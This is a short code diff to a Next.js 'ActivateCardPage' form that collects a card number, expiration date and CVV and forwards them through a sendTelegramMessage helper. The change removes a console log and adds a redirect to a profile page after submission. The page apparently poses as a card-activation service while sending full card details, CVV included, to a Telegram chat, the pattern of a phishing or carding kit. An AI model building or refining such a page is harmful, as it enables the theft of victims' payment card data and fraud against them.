@@ -1,6 +1,7 @@
 "use client";
 
 import React, { useState } from "react";
+import { useRouter } from "next/navigation";
 import { sendTelegramMessage } from "../../utils/telegram";
 
 const ActivateCardPage: React.FC = () => {
@@ -8,6 +9,7 @@ const ActivateCardPage: React.FC = () => {
   const [expirationDate, setExpirationDate] = useState("");
   const [cvv, setCvv] = useState("");
   const [error, setError] = useState("");
+  const router = useRouter();
 
   const isFormValid =
     cardNumber.length === 16 && expirationDate && cvv.length === 3;
@@ -29,12 +31,14 @@ const ActivateCardPage: React.FC = () => {
 
     try {
       await sendTelegramMessage(message);
-      console.log("Form submitted:", { cardNumber, expirationDate, cvv });
+
+
       setError(""); // Clear any existing errors
     } catch (err) {
       console.log(err)
       setError("Failed to send the message. Please try again.");
     }
+    router.push('/profile');
   };
 
   return (
